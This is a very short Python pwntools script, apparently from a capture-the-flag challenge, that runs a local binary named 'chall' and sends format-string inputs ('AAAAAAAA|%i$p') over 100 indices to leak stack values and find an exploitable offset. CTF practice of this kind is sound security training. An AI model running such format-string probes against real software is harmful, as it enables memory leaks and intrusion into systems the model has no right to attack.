from pwn import *
exe = context.binary = ELF('./chall')
r = process()
for i in range(100):
    r.sendline("1")
    r.sendline(f"AAAAAAAA|%{i}$p")
    r.sendline("2")
    print(r.recv(9999))